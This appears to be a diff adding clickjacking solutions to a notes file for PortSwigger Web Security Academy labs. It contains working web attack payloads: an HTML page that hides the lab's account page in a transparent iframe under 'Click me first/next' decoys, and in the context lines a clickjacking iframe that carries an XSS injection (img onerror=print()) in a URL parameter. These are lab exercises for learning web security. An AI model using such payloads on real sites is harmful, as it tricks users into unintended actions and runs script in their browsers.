@@ -104,3 +104,39 @@ div {
 <iframe src="https://0a7f0029042405a1804730750088006f.web-security-academy.net/feedback?name=%3cimg+src%3dx+onerror%3dprint()%3e&email=test%40test.com&subject=test&message=test#feedbackResult">
 </iframe>
 ```
+
+# Lab: Multistep clickjacking
+```html
+<style>
+iframe {
+position: relative;
+width: 1000px;
+height: 1000px;
+opacity: 0.00001;
+z-index: 2;
+}
+
+
+
+div#div-1 {
+    position: absolute;
+    top: 514px;
+    left: 55px;
+    z-index: 1;
+}
+
+div#div-2 {
+    position: absolute;
+    top: 312px;
+    left: 215px;
+    z-index: 1;
+}
+
+</style>
+
+<div id="div-1">Click me first</div>
+<div id="div-2">Click me next</div>
+<iframe src="https://0aa4002a04f4087b80969ee0005e001c.web-security-academy.net/my-account">
+
+</iframe>
+```
